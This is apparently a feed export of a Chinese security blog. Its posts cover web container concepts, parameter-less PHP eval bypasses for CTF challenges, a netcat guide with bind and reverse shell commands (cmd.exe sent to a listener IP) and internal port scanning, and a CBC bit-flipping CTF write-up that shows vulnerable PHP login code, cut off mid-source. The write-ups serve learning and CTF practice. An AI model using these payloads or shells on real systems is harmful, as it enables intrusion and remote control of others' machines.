title="容器"></a>容器</h1><p><strong>容器：</strong>容器是中间件的一种，作为操作系统和应用程序之间的桥梁，给处于其中的应用程序组件提供一个环境，使应用程序直接跟容器中的环境变量交互，而不必关注其它系统问题。例如：tomcat（servlet容器），Jboss(EJB容器)。这些容器提供的接口严格遵守J2EE规范中的web application 标准。</p><p><strong>web容器：</strong>我们把遵守J2EE规范标准的web服务器就叫做J2EE中的web容器。处理 web服务的容器，例如tomcat（servlet容器），IIS(asp容器)。web容器用于给处于其中的应用程序组件（ASP、JSP）提供一个环境，是中间件的一个组成部分，它实现了对动态语言的解析。比如tomcat可以解析jsp，是因为其内部有一个servlet容器。</p><p><strong>EJB容器(Enterprise java bean )：</strong>更具有行业领域特色。他提供给运行在其中的组件EJB各种管理功能。只要满足J2EE规范的EJB放入该容器，马上就会被容器进行高效率的管理。并且可以通过现成的接口来获得系统级别的服务。例如邮件服务、事务管理。</p><p>WEB容器和EJB容器在原理上是大体相同的，更多的区别是被隔离的外界环境。WEB容器更多的是跟基于HTTP的请求打交道。而 EJB容器不是。它是更多的跟数据库、其它服务打交道。但他们都是把与外界的交互实现从而减轻应用程序的负担。例如servlet不用关心http的细 节，直接引用环境变量session,request,response就行、EJB不用关心数据库连接速度、各种事务控制，直接由容器来完成。</p><p>所以说，我们也可以把 IIS(asp容器)、Tomcat(servlet容器)、Jboss(EJB容器)等叫做Web容器</p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>其实，对于这些名词，也并没有一个十分清楚的概念说这个就是属于这个，而不能属于那个。他们之间很多是包含关系。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">web服务器：IIS、Apache、Nginx、Tomcat、Jboss、Jetty、Weblogic、Webshere、Glasshfish、Lighttpd等</span><br><span class="line">web中间件：Tomcat、Jboss、Jetty、Weblogic、Webshere、Glasshfish等</span><br><span class="line">web容器：IIS(asp容器)、Tomcat(servlet容器)、Jboss(EJB容器)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;看web方向的东西也挺长时间了，这些概念还是区分不清，正好看见一篇博客具体介绍了这些概念。&lt;/p&gt;
&lt;p&gt;原文链接： &lt;/p&gt;
&lt;p&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/categories/web/"/>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/tags/web/"/>
    
      <category term="Java web" scheme="https://xytk0x0.github.io/tags/Java-web/"/>
    
  </entry>
  
  <entry>
    <title>blog的意义</title>
    <link href="https://xytk0x0.github.io/2019/10/20/blog%E7%9A%84%E6%84%8F%E4%B9%89/"/>
    <id>https://xytk0x0.github.io/2019/10/20/blog的意义/</id>
    <published>2019-10-20T06:56:20.000Z</published>
    <updated>2019-10-20T07:08:51.907Z</updated>
    
    <content type="html"><![CDATA[<p><strong>写博客确实让我更多的思考和实践，毕竟写出来不仅仅是给自己看的。</strong></p><p><strong>有一种新的利用姿势，我理解了十分，写出来的可能只有七分，你看过之后可能就只剩下三分了。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;写博客确实让我更多的思考和实践，毕竟写出来不仅仅是给自己看的。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;有一种新的利用姿势，我理解了十分，写出来的可能只有七分，你看过之后可能就只剩下三分了。&lt;/strong&gt;&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="日常生活的乱七八糟" scheme="https://xytk0x0.github.io/categories/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB%E7%9A%84%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/"/>
    
    
      <category term="Blog里的胡言乱语" scheme="https://xytk0x0.github.io/tags/Blog%E9%87%8C%E7%9A%84%E8%83%A1%E8%A8%80%E4%B9%B1%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>PHP无参数实现RCE</title>
    <link href="https://xytk0x0.github.io/2019/10/20/PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%AE%9E%E7%8E%B0RCE/"/>
    <id>https://xytk0x0.github.io/2019/10/20/PHP无参数实现RCE/</id>
    <published>2019-10-20T05:27:39.000Z</published>
    <updated>2019-10-20T23:35:53.552Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一叶飘零师傅的博客： <a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(&apos;;&apos; === preg_replace(&apos;/[^\W]+\((?R)?\)/&apos;, &apos;&apos;, $_GET[&apos;code&apos;])) &#123;    </span><br><span class="line">    eval($_GET[&apos;code&apos;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，[^\W]包含所有的数字，字母以及下划线，而(?R)则是 DEELX 正则表达式扩展语法中的递归表达式，表示递归引用整个模式。</p><p>正则只允许无参数函数通过校验。形式如下：</p><blockquote><p>a(b(c()));</p></blockquote><p>本文要bypass实现RCE</p><p>特征：<br>1、能够进行伪造(全局变量、$_FILES、$_COOKIE)<br>2、能够使用无参数函数读取<br>3、有执行权限</p><hr><h1 id="getenv"><a href="#getenv" class="headerlink" title="getenv()"></a>getenv()</h1><h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><p>PHP有很多的超全局变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS</span><br><span class="line">$_SERVER</span><br><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_FILES</span><br><span class="line">$_COOKIE</span><br><span class="line">$_SESSION</span><br><span class="line">$_REQUEST</span><br><span class="line">$_ENV</span><br></pre></td></tr></table></figure><p>使用getenv()得到$_ENV的值</p><img src="/2019/10/20/PHP无参数实现RCE/1.png" title="XYTK"><h2 id="取数组中的值"><a href="#取数组中的值" class="headerlink" title="取数组中的值"></a>取数组中的值</h2><p>结合array_flip()和array_rand()能够取出数组中的任意值。</p><p>array_rand():使用伪随机数算法得到任意键</p><img src="/2019/10/20/PHP无参数实现RCE/2.png" title="XYTK"><p>效果如下：</p><img src="/2019/10/20/PHP无参数实现RCE/4.png" title="XYTK"><p>array_flip():交换键和值</p><img src="/2019/10/20/PHP无参数实现RCE/3.png" title="XYTK"><p>效果如下：</p><img src="/2019/10/20/PHP无参数实现RCE/5.png" title="XYTK"><blockquote><p>可能的payload:<br>eval(array_flip(array_rand(getenv())))</p></blockquote><h1 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h1><p>在apache2环境下，有函数getallheaders()可返回http header信息。</p><p>返回值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">array(8) &#123; </span><br><span class="line">    [&quot;Host&quot;]=&gt; string(14) &quot;106.14.114.127&quot; </span><br><span class="line">    [&quot;Connection&quot;]=&gt; string(10) &quot;keep-alive&quot; </span><br><span class="line">    [&quot;Cache-Control&quot;]=&gt; string(9) &quot;max-age=0&quot; </span><br><span class="line">    [&quot;Upgrade-Insecure-Requests&quot;]=&gt; string(1) &quot;1&quot; </span><br><span class="line">    [&quot;User-Agent&quot;]=&gt; string(120) &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&quot; </span><br><span class="line">    [&quot;Accept&quot;]=&gt; string(118) &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;</span><br><span class="line">     [&quot;Accept-Encoding&quot;]=&gt; string(13) &quot;gzip, deflate&quot; [&quot;Accept-Language&quot;]=&gt; string(14) &quot;zh-CN,zh;q=0.9&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>可以改变http header的值，并当做PHP代码执行。</strong></p><img src="/2019/10/20/PHP无参数实现RCE/6.png" title="XYTK"><p>得到恶意的命令：</p><blockquote><p>var_dump(end(getallheaders()))</p></blockquote><img src="/2019/10/20/PHP无参数实现RCE/7.png" title="XYTK"><p>执行恶意命令：</p><img src="/2019/10/20/PHP无参数实现RCE/8.png" title="XYTK"><p>同样地，可以执行其他命令。</p><h1 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h1><p>get_defined_vars()不以中间件是apache为条件，适用范围更广。</p><p>可以回显全局变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_FILES</span><br><span class="line">$_COOKIE</span><br></pre></td></tr></table></figure><img src="/2019/10/20/PHP无参数实现RCE/9.png" title="XYTK"><p>使用$_GET方式利用流程如下：</p><img src="/2019/10/20/PHP无参数实现RCE/10.png" title="XYTK"><img src="/2019/10/20/PHP无参数实现RCE/11.png" title="XYTK"><p>通常来说，$_FILES更容易利用，不会被过滤。</p><h1 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h1><img src="/2019/10/20/PHP无参数实现RCE/12.png" title="XYTK"><p>通过脚本插入恶意参数(hex编码)更改会话ID ==&gt; eval(hex2bin(session_id(session_start())))</p><h1 id="文件及目录操作-dirname-amp-chdir"><a href="#文件及目录操作-dirname-amp-chdir" class="headerlink" title="文件及目录操作 dirname()&amp;chdir()"></a>文件及目录操作 dirname()&amp;chdir()</h1><p>getcwd():获取当前目录</p><p>scandir():扫描目录</p><p>dirname():跳到上一级目录</p><p>chdir():更改当前目录</p><p>结合var_dump()能够显示出扫描内容：</p><img src="/2019/10/20/PHP无参数实现RCE/13.png" title="XYTK">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一叶飘零师傅的博客： &lt;a href=&quot;https://skysec.top/2019/03/29/PHP-Parametric-Funct
      
    
    </summary>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/categories/web/"/>
    
      <category term="PHP" scheme="https://xytk0x0.github.io/categories/PHP/"/>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/tags/web/"/>
    
      <category term="PHP" scheme="https://xytk0x0.github.io/tags/PHP/"/>
    
      <category term="CTF" scheme="https://xytk0x0.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>工具-netcat</title>
    <link href="https://xytk0x0.github.io/2019/10/19/%E5%B7%A5%E5%85%B7-netcat/"/>
    <id>https://xytk0x0.github.io/2019/10/19/工具-netcat/</id>
    <published>2019-10-19T07:42:47.000Z</published>
    <updated>2019-10-26T01:12:29.186Z</updated>
    
    <content type="html"><![CDATA[<h1 id="工具系列"><a href="#工具系列" class="headerlink" title="工具系列"></a>工具系列</h1><p>完整的渗透测试过程中，工具能够提供很多帮助，但一段时间不用之后就会忘记，用的时候又需要重新查，很麻烦。于是，就有了这个系列。</p><hr><h1 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h1><p>Netcat 常称为 nc，拥有“瑞士军刀”的美誉。nc 小巧强悍，可以读写TCP或UDP网络连接，它被设计成一个可靠的后端工具，能被其它的程序或脚本直接驱动。同时，它又是一个功能丰富的网络调试和开发工具，因为它可以建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能，它基于socket协议工作。在渗透测试领域，我们通常利用它来反弹shell。</p><h1 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h1><blockquote><p>-l： 开启监听<br>-p：指定端口<br>-t： 以telnet形式应答<br>-e：程序重定向<br>-n：以数字形式表示ip<br>-v：显示执行命令过程<br>-z :  不进行交互，直接显示结果<br>-u ：使用UDP协议传输<br>-w :  设置超时时间</p></blockquote><h1 id="用法实例"><a href="#用法实例" class="headerlink" title="用法实例"></a>用法实例</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>如果是想单纯的端口扫描的话，利用其它工具比如 nmap会更好。nc端口扫描最主要的用途是，当我们获得了一个网站的权限之后，我们想再渗透进该网站的内网进行渗透。然而，我们的nmap工具是不能扫描到内网的，所以这时我们可以把nc上传到web服务器上，利用它来扫描内网主机。而由于nc体积很小，所以不容易被发现。</p><blockquote><p>nc  -z -v -n 192.168.10.14  20-23   #端口或端口范围</p></blockquote><p>如果探测到端口开放了，比如上面的 80 端口开放了，我们就可以继续探测其banner信息： </p><blockquote><p>nc -v -n 192.168.10.14  80<br>然后输入get</p></blockquote><h2 id="实现简易聊天"><a href="#实现简易聊天" class="headerlink" title="实现简易聊天"></a>实现简易聊天</h2><p>一端监听，一端发送。简易的C/S架构。</p><blockquote><p>服务器端：<br>nc   -lvp    8888      #监听8888端口  -l 监听 -v 显示详细信息  -p 指定端口</p></blockquote><blockquote><p>客户端：<br>nc  -nv  10.96.10.208  8888    #连接到服务器的8888端口  -n以数字形式显示ip  -v显示详细信息</p></blockquote><h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><blockquote><p>服务器端：<br>nc  -lvp  8888 &lt; test.txt</p></blockquote><blockquote><p>客户端：<br>nc -nv 10.96.10.208 8888 &gt;test.txt</p></blockquote><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>意思就是我们主动连接肉鸡</p><p>假如我们现在入侵到了一台主机上，我们可以通过执行以下命令将该主机的cmd命令弹到8888端口上</p><p>肉鸡</p><blockquote><p>nc -lv -p 8888 -t -e cmd.exe</p></blockquote><p>我们的主机</p><blockquote><p>nc  -nv  192.168.10.14  8888            #我们的主机访问该肉鸡的8888端口</p></blockquote><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>意思就是我们监听端口，然后肉鸡主动连接到我们的主机</p><p>我们的主机</p><blockquote><p>nc  -lvp  8888</p></blockquote><p>肉鸡</p><blockquote><p>nc  -t -e cmd.exe 10.96.10.208 8888</p></blockquote><h2 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐(?)"></a>蜜罐(?)</h2><p>一直监听8888端口，知道 ctrl+C 停止</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​​​​​​​&gt; nc  -L -p  8888  &gt; log.txt   #监听8888端口，并且将日志信息写入log.txt中</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;工具系列&quot;&gt;&lt;a href=&quot;#工具系列&quot; class=&quot;headerlink&quot; title=&quot;工具系列&quot;&gt;&lt;/a&gt;工具系列&lt;/h1&gt;&lt;p&gt;完整的渗透测试过程中，工具能够提供很多帮助，但一段时间不用之后就会忘记，用的时候又需要重新查，很麻烦。于是，就有了这个系列。
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://xytk0x0.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="tools" scheme="https://xytk0x0.github.io/categories/tools/"/>
    
    
      <category term="tools" scheme="https://xytk0x0.github.io/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>【wp】bugku-login4&amp;CBC字节翻转攻击</title>
    <link href="https://xytk0x0.github.io/2019/10/19/%E3%80%90wp%E3%80%91bugku-login4-CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"/>
    <id>https://xytk0x0.github.io/2019/10/19/【wp】bugku-login4-CBC字节翻转攻击/</id>
    <published>2019-10-19T03:42:09.000Z</published>
    <updated>2019-10-20T23:33:49.507Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>题目中遇到了CBC字节翻转攻击，借此机会系统的学习一下。</p><p>CBC字节翻转攻击的精髓在于损坏密文来改变明文。</p><h2 id="资料链接："><a href="#资料链接：" class="headerlink" title="资料链接："></a>资料链接：</h2><p><a href="https://blog.csdn.net/csu_vc/article/details/79619309" target="_blank" rel="noopener">https://blog.csdn.net/csu_vc/article/details/79619309</a></p><p><a href="https://skysec.top/2017/06/16/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">https://skysec.top/2017/06/16/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</a></p><hr><h1 id="CBC字节翻转攻击原理"><a href="#CBC字节翻转攻击原理" class="headerlink" title="CBC字节翻转攻击原理"></a>CBC字节翻转攻击原理</h1><h2 id="加密原理图："><a href="#加密原理图：" class="headerlink" title="加密原理图："></a>加密原理图：</h2><img src="/2019/10/19/【wp】bugku-login4-CBC字节翻转攻击/CBC_0.png" title="XYTK"><p>1、Plaintext：待加密的数据。</p><p>2、IV：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。</p><p>3、Ciphertext：加密后的数据</p><p>PS:</p><p>1、CBC工作于一个固定长度的比特组，被称为块。</p><p>2、CBC的填充规则是缺少N位，就是用N个’\xN’填充。</p><img src="/2019/10/19/【wp】bugku-login4-CBC字节翻转攻击/CBC_1.jpg" title="XYTK"><h2 id="解密原理图："><a href="#解密原理图：" class="headerlink" title="解密原理图："></a>解密原理图：</h2><img src="/2019/10/19/【wp】bugku-login4-CBC字节翻转攻击/CBC_2.png" title="XYTK"><h2 id="翻转攻击原理图："><a href="#翻转攻击原理图：" class="headerlink" title="翻转攻击原理图："></a>翻转攻击原理图：</h2><img src="/2019/10/19/【wp】bugku-login4-CBC字节翻转攻击/CBC_3.png" title="XYTK"><p>这里可以注意到前一块Ciphertext用来产生下一块明文，如果我们改变前一块Ciphertext中的一个字节，然后和下一块解密后的密文xor，就可以得到一个不同的明文，而这个明文是我们可以控制的。利用这一点，我们就欺骗服务端或者绕过过滤器。</p><h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><blockquote><p>当我们的一个值C是由A和B异或得到<br>C = A XOR B<br>那么<br>A XOR B XOR C很明显是=0的<br>当我们知道B和C之后，想要得到A的值也很容易<br>A = B XOR C<br>因此，A XOR B XOR C等于0。有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，即可改变。</p></blockquote><hr><h1 id="bugku-login4"><a href="#bugku-login4" class="headerlink" title="bugku-login4"></a>bugku-login4</h1><p>打开是一个登录页面。</p><p>页面如下：</p><img src="/2019/10/19/【wp】bugku-login4-CBC字节翻转攻击/log0.png" title="XYTK"><p>随便输入后登录</p><img src="/2019/10/19/【wp】bugku-login4-CBC字节翻转攻击/login1.png" title="XYTK"><p>使用admin登录后显示</p><blockquote><p>admin are not allowed to login</p></blockquote><p>没发现注入点后，进行扫描</p><img src="/2019/10/19/【wp】bugku-login4-CBC字节翻转攻击/login2.png" title="XYTK"><p>访问该目录，能够得到一个index.php.swp文件，该文件是使用vi编辑器时自动生成的，在非正常状态下退出没有被删除。</p><p>使用vim -r 文件名还原。</p><p>得到代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Login Form&lt;/title&gt;</span><br><span class="line">&lt;link href=&quot;static/css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;static/js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">$(document).ready(function() &#123;</span><br><span class="line">$(&quot;.username&quot;).focus(function() &#123;</span><br><span class="line">$(&quot;.user-icon&quot;).css(&quot;left&quot;,&quot;-48px&quot;);</span><br><span class="line">&#125;);</span><br><span class="line">$(&quot;.username&quot;).blur(function() &#123;</span><br><span class="line">$(&quot;.user-icon&quot;).css(&quot;left&quot;,&quot;0px&quot;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$(&quot;.password&quot;).focus(function() &#123;</span><br><span class="line">$(&quot;.pass-icon&quot;).css(&quot;left&quot;,&quot;-48px&quot;);</span><br><span class="line">&#125;);</span><br><span class="line">$(&quot;.password&quot;).blur(function() &#123;</span><br><span class="line">$(&quot;.pass-icon&quot;).css(&quot;left&quot;,&quot;0px&quot;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">define(&quot;SECRET_KEY&quot;, file_get_contents(&apos;/root/key&apos;));</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">//得到初始向量   16位</span><br><span class="line">function get_random_iv()</span><br><span class="line">&#123;</span><br><span class="line">    $random_iv=&apos;&apos;;</span><br><span class="line">    for($i=0;$i&lt;16;$i++)</span><br><span class="line">&#123;</span><br><span class="line">        $random_iv.=chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function login($info)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);   //序列化</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);     //密文</span><br><span class="line">    $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">//设置cookie</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">//base64_decode解码</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))</span><br><span class="line">&#123;</span><br><span class="line">            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);</span><br><span class="line">            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">        &#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//显示账号信息</span><br><span class="line">function show_homepage()</span><br><span class="line">&#123;</span><br><span class="line">    if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)</span><br><span class="line">&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Flag is $flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $username = (string)$_POST[&apos;username&apos;];</span><br><span class="line">    $password = (string)$_POST[&apos;password&apos;];</span><br><span class="line"></span><br><span class="line">//绕过这的等号</span><br><span class="line">    if($username === &apos;admin&apos;)</span><br><span class="line">&#123;</span><br><span class="line">        exit(&apos;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    if(isset($_SESSION[&quot;username&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">        echo &apos;&lt;body class=&quot;login-body&quot;&gt;</span><br><span class="line">                &lt;div id=&quot;wrapper&quot;&gt;</span><br><span class="line">                    &lt;div 